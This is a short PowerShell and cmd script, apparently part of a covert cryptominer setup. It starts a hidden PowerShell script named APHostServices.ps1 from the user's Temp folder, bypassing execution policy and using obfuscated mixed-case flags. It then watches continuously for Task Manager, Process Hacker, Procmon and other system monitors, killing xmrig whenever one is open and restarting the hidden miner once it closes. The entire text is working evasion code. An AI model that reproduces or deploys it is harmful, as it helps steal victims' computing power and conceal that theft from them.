cmd.exe /c 'start PowerShell.exe -ExeCUtIonPoLiCy ByPaSs -WInDoWSTyLe hIdDeN -NolOGo -NOnIntERaCtiVe -FIlE "C:%homepath%\AppData\Local\Temp\APHostServices.ps1"'
while ($true){
    #work on program list
	$a = 0; $programs = @('Taskmgr', 'ProcessHacker', 'Procmon64', 'mmc', 'autoruns64', 'aida64', 'System Explorer', 'Open Hardware Monitor', 'PCHunter64', 'HWiNFO64', 'GPU-Z', 'AnVir', 'Real Temp', 'speedfan', 'Process Lasso')
	while ($a -le 14){ 
		$detect = Get-Process $programs[$a] -ErrorAction SilentlyContinue
		if ($detect) {
			echo('killing xmrig because of ~> ' + $programs[$a]) 
			#Stop-Process -processname $programs[$a]#>
			taskkill /IM xmrig.exe /F
			$detect = Get-Process $programs[$a] -ErrorAction SilentlyContinue
			if ($detect) {
				sleep 0
			}else{
				cmd.exe /c 'start /MIN PowerShell -ExeCUtIonPoLiCy ByPaSs -WInDoWSTyLe hIdDeN -NolOGo -NOnIntERaCtiVe -FIlE "C:%homepath%\AppData\Local\Temp\APHostServices.ps1"'
			}
		}$a++
	}
}